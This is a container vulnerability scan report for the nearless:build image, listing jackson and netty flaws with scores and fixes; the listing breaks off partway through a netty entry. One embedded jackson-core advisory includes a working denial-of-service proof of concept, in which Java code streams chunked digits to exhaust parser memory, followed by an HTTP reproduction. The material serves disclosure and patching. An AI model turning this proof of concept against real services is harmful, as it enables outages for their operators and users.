```yaml
╭ [0] ╭ Target  : nmaguiar/nearless:build (alpine 3.24.1) 
│     ├ Class   : os-pkgs 
│     ├ Type    : alpine 
│     ╰ Packages 
╰ [1] ╭ Target         : Java 
      ├ Class          : lang-pkgs 
      ├ Type           : jar 
      ├ Packages        
      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
                        │      ├ PkgPath         : openaf/openaf.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.2
                        │      │                  │       2.0 
                        │      │                  ╰ UID : 348817934bcfb1b0 
                        │      ├ InstalledVersion: 2.22.0 
                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:fc7e75a0e390d99644f029d5f9ac8e6740f99321794f36ad78130
                        │      │                   e4a8b86bc44 
                        │      ├ Title           : jackson-core: Async parser maxNumberLength bypass via
                        │      │                   chunked digit accumulation (incomplete fix for
                        │      │                   GHSA-72hv-8253-57qq) 
                        │      ├ Description     : ## Summary
                        │      │                   
                        │      │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
                        │      │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-c
                        │      │                   ore/security/advisories/GHSA-72hv-8253-57qq) (Number Length
                        │      │                   Constraint Bypass in Async Parser, published 2026-02-28) is
                        │      │                   incomplete. The fix commit `b0c428e6` (#1555) wired
                        │      │                   `validateIntegerLength` into a new `_setIntLength` helper
                        │      │                   and called it at every place where the integer portion of a
                        │      │                   number is *decided* (terminator byte arrived, `.` / `e/E`
                        │      │                   seen, end-of-feed inside a fully-buffered value). It did not
                        │      │                    call it on the much more attacker-relevant path: "ran out
                        │      │                   of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`,
                        │      │                   return `NOT_AVAILABLE` to caller".
                        │      │                   As a result, an attacker who streams JSON to a non-blocking
                        │      │                   parser in many small chunks, without ever sending a
                        │      │                   terminator byte, can keep the parser inside
                        │      │                   `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
                        │      │                   `_textBuffer.expandCurrentSegment()` grows on every chunk,
                        │      │                   and `validateIntegerLength` is never invoked. The
                        │      │                   accumulator is only gated by `maxStringLength` (20 MiB
                        │      │                   default) — a **~20,000x amplification** of the documented
                        │      │                   `maxNumberLength` (1000 default).
                        │      │                   This is the same vulnerability class, same advisory wording
                        │      │                   ("Memory Exhaustion: Unbounded allocation in TextBuffer from
                        │      │                    excessively long numbers"), same parser class — just the
                        │      │                   streaming path the original fix didn't cover. The fix to the
                        │      │                    *fraction* path is correct (see `_finishFloatFraction` at
                        │      │                   line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in
                        │      │                   2.18.6, where `_setFractLength(fractLen)` IS called before
                        │      │                   the `NOT_AVAILABLE` return); the equivalent call is missing
                        │      │                   from every integer-digit path.
                        │      │                   ## Affected versions
                        │      │                   Verified on the patched releases:
                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
                        │      │                   Structurally identical code in `tools.jackson.core` 3.0.x /
                        │      │                   3.1.x — same `NonBlockingUtf8JsonParserBase` class, same
                        │      │                   `_setIntLength` rollout, same NOT_AVAILABLE returns without
                        │      │                   validation. Not retested but presumed vulnerable.
                        │      │                   ## Affected code
                        │      │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlo
                        │      │                   ckingUtf8JsonParserBase.java`](https://github.com/FasterXML/
                        │      │                   jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jacks
                        │      │                   on/core/json/async/NonBlockingUtf8JsonParserBase.java) in
                        │      │                   2.18.6 / 2.21.1.
                        │      │                   ### Site 1 — `_startPositiveNumber(int ch)` lines
                        │      │                   1320-1330:
                        │      │                   ```java
                        │      │                   if (outPtr >= outBuf.length) {
                        │      │                       // NOTE: must expand to ensure contents all in a single
                        │      │                   buffer (to keep
                        │      │                       // other parts of parsing simpler)
                        │      │                       outBuf = _textBuffer.expandCurrentSegment();
                        │      │                   }
                        │      │                   outBuf[outPtr++] = (char) ch;
                        │      │                   if (++_inputPtr >= _inputEnd) {
                        │      │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                        │      │                       _textBuffer.setCurrentLength(outPtr);
                        │      │                       return _updateTokenToNA();          // <-- no
                        │      │                   validateIntegerLength(outPtr)
                        │      │                   ```
                        │      │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
                        │      │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf,
                        │      │                    int outPtr) throws IOException {
                        │      │                       int negMod = _numberNegative ? -1 : 0;
                        │      │                       while (true) {
                        │      │                           if (_inputPtr >= _inputEnd) {
                        │      │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                        │      │                               _textBuffer.setCurrentLength(outPtr);
                        │      │                               return _updateTokenToNA();    // <-- no
                        │      │                   validateIntegerLength(outPtr + negMod)
                        │      │                           }
                        │      │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
                        │      │                           if (ch < INT_0) {
                        │      │                               if (ch == INT_PERIOD) {
                        │      │                                   _setIntLength(outPtr+negMod);   // <--
                        │      │                   validated here
                        │      │                                   ++_inputPtr;
                        │      │                                   return _startFloat(outBuf, outPtr, ch);
                        │      │                               }
                        │      │                               break;
                        │      │                           if (ch > INT_9) {
                        │      │                               if ((ch | 0x20) == INT_e) {
                        │      │                           ++_inputPtr;
                        │      │                           if (outPtr >= outBuf.length) {
                        │      │                               outBuf = _textBuffer.expandCurrentSegment();
                        │      │                           outBuf[outPtr++] = (char) ch;
                        │      │                       }
                        │      │                       _setIntLength(outPtr+negMod);            // <--
                        │      │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
                        │      │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395,
                        │      │                   1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of
                        │      │                    input mid-integer" exit returns to the caller without
                        │      │                   validating the accumulator length.
                        │      │                   ### Compare with the fraction path that is correct
                        │      │                   `_finishFloatFraction` lines 1827-1838:
                        │      │                   while (loop) {
                        │      │                       if (ch >= INT_0 && ch <= INT_9) {
                        │      │                           ++fractLen;
                        │      │                               _setFractLength(fractLen);          // <--
                        │      │                   VALIDATED
                        │      │                               return JsonToken.NOT_AVAILABLE;
                        │      │                           ch = getNextSignedByteFromBuffer();
                        │      │                       ...
                        │      │                   ## Impact
                        │      │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus,
                        │      │                   Helidon, Vert.x JSON, anything wrapping
                        │      │                   `JsonFactory.createNonBlockingByteArrayParser()` or
                        │      │                   `createNonBlockingByteBufferParser()`) feed inbound
                        │      │                   HTTP/gRPC bytes to the async parser as they arrive.
                        │      │                   Operators who set
                        │      │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the
                        │      │                   assumption that this caps memory per number value are not
                        │      │                   getting that guarantee in chunked-feed scenarios. The parser
                        │      │                    silently accumulates digits up to `maxStringLength` (20 MiB
                        │      │                    default) per concurrent connection. Multiply by
                        │      │                   attacker-controlled concurrency to OOM the JVM.
                        │      │                   The synchronous parsers (`UTF8StreamJsonParser`,
                        │      │                   `ReaderBasedJsonParser`) and the async parser on *complete*
                        │      │                   input are not affected — those paths go through
                        │      │                   `_setIntLength` or `ParserBase._reportTooLongIntegral`
                        │      │                   correctly.
                        │      │                   CWE-770 (Allocation of Resources Without Limits or
                        │      │                   Throttling), CVSS roughly the same as the parent advisory
                        │      │                   (Network / Low complexity / High availability impact). The
                        │      │                   parent advisory was scored CVSS 8.7 High.
                        │      │                   ## Proof of concept
                        │      │                   Standalone PoC, no Maven required:
                        │      │                   mkdir poc && cd poc
                        │      │                   curl -sLo jackson-core-2.18.6.jar
                        │      │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/ja
                        │      │                   ckson-core/2.18.6/jackson-core-2.18.6.jar
                        │      │                   cat > PoC.java <<'EOF'
                        │      │                   import com.fasterxml.jackson.core.*;
                        │      │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
                        │      │                   public class PoC {
                        │      │                       public static void main(String[] args) throws Exception
                        │      │                   {
                        │      │                           StreamReadConstraints strict =
                        │      │                   StreamReadConstraints.builder()
                        │      │                                   .maxNumberLength(1000)
                        │      │                                   .build();
                        │      │                           JsonFactory f = new JsonFactoryBuilder()
                        │      │                                   .streamReadConstraints(strict)
                        │      │                           // Sanity: synchronous parser rejects 5000-digit
                        │      │                   int.
                        │      │                           try (JsonParser p = f.createParser("{\"v\":" +
                        │      │                   "1".repeat(5000) + "}")) {
                        │      │                               while (p.nextToken() != null) { /* drive */ }
                        │      │                               System.out.println("[-] BUG ABSENT: sync parser
                        │      │                   accepted");
                        │      │                               return;
                        │      │                           } catch (Exception e) {
                        │      │                               System.out.println("[+] sync parser rejected
                        │      │                   5000-digit int: " + e.getClass().getSimpleName());
                        │      │                           // Bug: async parser, chunked, no terminator.
                        │      │                           JsonParser ap =
                        │      │                   f.createNonBlockingByteArrayParser();
                        │      │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
                        │      │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
                        │      │                           feeder.feedInput(preamble, 0, preamble.length);
                        │      │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) {
                        │      │                   /* drain */ }
                        │      │                           byte[] digits = new byte[16 * 1024];
                        │      │                           for (int i = 0; i < digits.length; i++) digits[i] =
                        │      │                   (byte) ('1' + (i % 9));
                        │      │                           for (int c = 0; c < 600; c++) {
                        │      │                               feeder.feedInput(digits, 0, digits.length);
                        │      │                               JsonToken t = ap.nextToken();
                        │      │                               if (t != JsonToken.NOT_AVAILABLE) {
                        │      │                                   System.out.println("[-] unexpected token: "
                        │      │                   + t);
                        │      │                                   return;
                        │      │                           System.out.println("[+] BUG PRESENT: async parser
                        │      │                   accepted ~9.83 MB of digits with maxNumberLength=1000");
                        │      │                           // Closing the number now finally triggers the
                        │      │                   validator.
                        │      │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
                        │      │                           feeder.endOfInput();
                        │      │                           try {
                        │      │                               while (ap.nextToken() != null) { /* drive */ }
                        │      │                               System.out.println("[*] late rejection on close:
                        │      │                    " + e.getMessage().split("\n")[0]);
                        │      │                           ap.close();
                        │      │                   EOF
                        │      │                   javac -cp jackson-core-2.18.6.jar PoC.java
                        │      │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
                        │      │                   Observed output against `jackson-core-2.18.6`:
                        │      │                   [+] sync parser rejected 5000-digit int:
                        │      │                   StreamConstraintsException
                        │      │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits
                        │      │                   with maxNumberLength=1000
                        │      │                   [*] late rejection on close: Number value length (9830400)
                        │      │                   exceeds the maximum allowed (1000, from
                        │      │                   `StreamReadConstraints.getMaxNumberLength()`)
                        │      │                   Observed output against `jackson-core-2.21.1`: identical.
                        │      │                   The 9.83 MB figure is purely a function of the loop bound
                        │      │                   (600 chunks * 16 KiB). The actual ceiling is
                        │      │                   `maxStringLength = 20 MiB`. With the strict policy declared
                        │      │                   as `maxNumberLength = 1000`, the parser permits **9830x**
                        │      │                   more allocation than the policy allows. With
                        │      │                   `maxStringLength` left at the default 20 MiB, an attacker
                        │      │                   can drive a single connection to 40 MiB of `char[]` heap
                        │      │                   (chars are 2 bytes each) before the validator finally fires
                        │      │                   on terminator/`endOfInput()`. Multiply by concurrent
                        │      │                   connections.
                        │      │                   ## End-to-end reproduction through real HTTP
                        │      │                   Supplements the standalone PoC with a running Spring Boot
                        │      │                   WebFlux server,
                        │      │                   driving the same bug through the actual reactor-netty +
                        │      │                   Jackson2JsonDecoder
                        │      │                   streaming-decode path that production reactive endpoints
                        │      │                   use.
                        │      │                   Setup:
                        │      │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14,
                        │      │                   reactor-netty 1.1.23)
                        │      │                   - jackson-databind 2.17.2, jackson-core overridden:
                        │      │                     - VULN run:
                        │      │                   `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
                        │      │                   published)
                        │      │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix
                        │      │                   branch
                        │      │                   - JVM: OpenJDK 17.0.18
                        │      │                   - Server `JsonFactory` configured with
                        │      │                   `StreamReadConstraints.builder().maxNumberLength(1000).build
                        │      │                   ()`
                        │      │                   Endpoint under test exposes the `Flux<DataBuffer>` request
                        │      │                   body directly to
                        │      │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so
                        │      │                   the parser sees one
                        │      │                   HTTP chunk per `feedInput` (the same pattern used for any
                        │      │                   `@RequestBody Flux<...>` / streaming JSON decoder in
                        │      │                   WebFlux). A raw-socket
                        │      │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of
                        │      │                   200 digit bytes
                        │      │                   each (50,000 digits total) at 20ms intervals, then writes
                        │      │                   the closing `}`.
                        │      │                   VULN — jackson-core 2.18.7:
                        │      │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks;
                        │      │                   server still accepting
                        │      │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
                        │      │                   HTTP/1.1 200 OK
                        │      │                   ERR after 6548ms
                        │      │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsExcept
                        │      │                   ion:
                        │      │                          Number value length (50000) exceeds the maximum
                        │      │                   allowed (1000, ...)
                        │      │                   Server-side controller trace (250 DataBuffer arrivals
                        │      │                   elided):
                        │      │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=42
                        │      │                   ...
                        │      │                   [ctrl] DataBuffer arrived size=199 ms=5993
                        │      │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing
                        │      │                   '}'
                        │      │                   [ctrl] ERR after 6548ms ... Number value length (50000)
                        │      │                   exceeds ...
                        │      │                   Server held all 50,000 digit characters in `_textBuffer` for
                        │      │                    6.5 seconds with
                        │      │                   `maxNumberLength=1000` declared. The validator never fires
                        │      │                   during streaming;
                        │      │                   it only fires at value-completion when the closing `}`
                        │      │                   arrives.
                        │      │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
                        │      │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at
                        │      │                   chunk 14: [Errno 32] Broken pipe
                        │      │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
                        │      │                   status=connection-broke-mid-stream
                        │      │                   Server-side controller trace:
                        │      │                   [ctrl] DataBuffer arrived size=6   ms=129
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=142
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=145
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=146
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=147
                        │      │                   [ctrl] ERR after 155ms ... Number value length (1001)
                        │      │                   exceeds the maximum allowed (1000, ...)
                        │      │                   Patched server raises `StreamConstraintsException` at 155ms
                        │      │                   after only 5
                        │      │                   DataBuffers, exactly when the accumulated digit count
                        │      │                   crosses
                        │      │                   `maxNumberLength=1000`. The connection is reset mid-stream
                        │      │                   rather than the
                        │      │                   parser silently consuming the rest of the attacker's
                        │      │                   payload.
                        │      │                   Side-by-side:
                        │      │                   | Build | Chunks accepted before exception | Digits buffered
                        │      │                    | Time to detection |
                        │      │                   |---|---|---|---|
                        │      │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the
                        │      │                    configured limit) | 6,548ms — only at terminator |
                        │      │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment
                        │      │                   threshold crossed |
                        │      │                   Note on the default `@RequestBody Mono<JsonNode>` path: that
                        │      │                    path cannot
                        │      │                   distinguish the two builds because Spring's `decodeToMono`
                        │      │                   joins all
                        │      │                   DataBuffers into one before parsing. The exploitable shape
                        │      │                   is the
                        │      │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody
                        │      │                   Flux<...>` /
                        │      │                   WebSocket / SSE / any direct
                        │      │                   `decoder.decode(Flux<DataBuffer>, ...)` call),
                        │      │                   which is also what `Jackson2Tokenizer` uses for any
                        │      │                   streaming JSON
                        │      │                   deserialization in WebFlux and Quarkus reactive REST.
                        │      │                   ## Suggested fix
                        │      │                   Mirror the pattern already used in `_finishFloatFraction`.
                        │      │                   At every site that returns `_updateTokenToNA()` (or
                        │      │                   `JsonToken.NOT_AVAILABLE`) with `_minorState =
                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr +
                        │      │                   negMod)` first. Concretely, the diff to
                        │      │                   `NonBlockingUtf8JsonParserBase.java` would be:
                        │      │                   ```diff
                        │      │                        protected JsonToken _finishNumberIntegralPart(char[]
                        │      │                   outBuf, int outPtr) throws IOException {
                        │      │                            int negMod = _numberNegative ? -1 : 0;
                        │      │                            while (true) {
                        │      │                                if (_inputPtr >= _inputEnd) {
                        │      │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                        │      │                                    _textBuffer.setCurrentLength(outPtr);
                        │      │                   +               
                        │      │                   _streamReadConstraints.validateIntegerLength(outPtr +
                        │      │                   negMod);
                        │      │                                    return _updateTokenToNA();
                        │      │                                }
                        │      │                   Note: `_setIntLength` itself can't be used as-is because it
                        │      │                   also assigns `_intLength`, and `_intLength` must not be set
                        │      │                   until the integer is truly complete (subsequent fraction
                        │      │                   handling reads `_intLength`). The minimal fix is to call
                        │      │                   only the validator, as shown.
                        │      │                   Apply the same one-line insertion before each `return
                        │      │                   _updateTokenToNA();` that exits with `_minorState =
                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12
                        │      │                    lines total).
                        │      │                   Alternatively, a heavier refactor: also gate
                        │      │                   `_textBuffer.expandCurrentSegment()` calls inside the
                        │      │                   digit-accumulation loops on `outPtr < maxNumberLength` so
                        │      │                   that the validator fires at the moment the buffer would be
                        │      │                   enlarged past the limit, rather than waiting for the next
                        │      │                   chunk boundary. Either approach is sufficient.
                        │      │                   ## Credit
                        │      │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant
                        │      │                    hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq. 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
                        │      │                         ╰ V40Score : 8.7 
                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b4
                        │      │                  │      29804dce2a7e08f0be1b0b4c3d040fdb9cd 
                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd5
                        │      │                  │      29749da396cc7edf6d4a2aad41d47902641 
                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941
                        │      │                  │      e5aae7fd5aeac55d66933cfb82b9aabeef8 
                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
                        │      │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/adv
                        │      │                         isories/GHSA-r7wm-3cxj-wff9 
                        │      ├ PublishedDate   : 2026-07-21T21:58:53Z 
                        │      ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
                        ├ [1]  ╭ VulnerabilityID : CVE-2026-54515 
                        │      ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
                        │      ├ PkgPath         : openaf/openaf.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
                        │      │                  │       @2.22.0 
                        │      │                  ╰ UID : c3b2e55f064f8b6 
                        │      ├ InstalledVersion: 2.22.0 
                        │      ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:b7f2c4435feb4724b183d713f239cb3996426b66ed390893ee48d
                        │      │                   9fa5f96af5b 
                        │      ├ Title           : jackson-databind: jackson-databind: Ignored properties can
                        │      │                   be unexpectedly modified 
                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
                        │      │                   functionality and tree-model for Jackson Data Processor.
                        │      │                   From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
                        │      │                   BeanDeserializerBase.createContextual(), per-property
                        │      │                   @JsonIgnoreProperties exclusions are applied by
                        │      │                   _handleByNameInclusion(), producing a contextual
                        │      │                   deserializer whose BeanPropertyMap has the ignored
                        │      │                   properties removed. The subsequent per-property
                        │      │                   case-insensitivity block (triggered by
                        │      │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
                        │      │                   from this._beanProperties (the original, unfiltered map)
                        │      │                   instead of contextual._beanProperties, then overwrites the
                        │      │                   filtered map — restoring every property
                        │      │                   _handleByNameInclusion had just removed. The ignored
                        │      │                   property becomes writable again. This vulnerability is fixed
                        │      │                    in 2.18.9, 2.21.5, and 3.1.4. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-915 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ ghsa  : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
                        │      │                  │        │           /A:N 
                        │      │                  │        ╰ V3Score : 5.3 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 5.3 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0
                        │      │                  │      e1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5
                        │      │                  │      962 
                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5
                        │      │                  │      964 
                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security
                        │      │                  │      /advisories/GHSA-5jmj-h7xm-6q6v 
                        │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
                        │      ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
                        │      ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
                        ├ [2]  ╭ VulnerabilityID : CVE-2026-59889 
                        │      ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
                        │      ├ PkgPath         : openaf/openaf.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
                        │      │                  │       @2.22.0 
                        │      │                  ╰ UID : c3b2e55f064f8b6 
                        │      ├ InstalledVersion: 2.22.0 
                        │      ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:ecf3aab92fa804d8848f75f1a0803ec4546d3c3adee768fee9afd
                        │      │                   9c03d011fa9 
                        │      ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped
                        │      │                   container properties on deserialization 
                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
                        │      │                   functionality and tree-model for Jackson Data Processor.
                        │      │                   From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1,
                        │      │                   UnwrappedPropertyHandler.processUnwrapped() replays buffered
                        │      │                    JSON for a @JsonUnwrapped property and calls
                        │      │                   prop.deserializeAndSet() without a
                        │      │                   prop.visibleInView(ctxt.getActiveView()) guard, allowing a
                        │      │                   property annotated with both @JsonView and @JsonUnwrapped to
                        │      │                    be written from attacker JSON under a less-privileged
                        │      │                   active view. This issue is fixed in versions 2.18.9, 2.21.5,
                        │      │                    2.22.1, 3.1.5, and 3.2.1. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-863 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
                        │      │                         ╰ V3Score : 6.5 
                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d
                        │      │                  │      627a8a86fcb062429282f79f3f256f181ed2c7b 
                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6
                        │      │                  │      060 
                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
                        │      │                  │      /advisories/GHSA-5gvw-p9qm-jgwh 
                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
                        │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
                        │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
                        ├ [3]  ╭ VulnerabilityID : CVE-2026-59901 
                        │      ├ VendorIDs        ─ [0]: GHSA-558v-64gr-wgg4 
                        │      ├ PkgName         : io.netty:netty-codec-compression 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.15.Final 
                        │      │                  ╰ UID : 2e8e76cf94b0172 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59901 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:f1bb16a49adf09885b1616e54556f93bf3314f5818afb070cb8c4
                        │      │                   21f244b1589 
                        │      ├ Title           : io.netty/netty-codec-compression: Netty: Infinite loop in
                        │      │                   netty-codec-compression (bzip2) 
                        │      ├ Description     : A flaw was found in the netty-codec-compression component of
                        │      │                    Netty. This vulnerability, caused by a logic error in the
                        │      │                   bzip2 decoder, allows a remote attacker to send specially
                        │      │                   crafted bzip2-compressed data. Processing this malformed
                        │      │                   data can trigger an infinite loop, causing the decoder
                        │      │                   thread to consume excessive CPU resources. This leads to a
                        │      │                   denial of service (DoS), requiring manual intervention to
                        │      │                   restore service. 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ╭ ghsa  : 3 
                        │      │                  ╰ redhat: 3 
                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
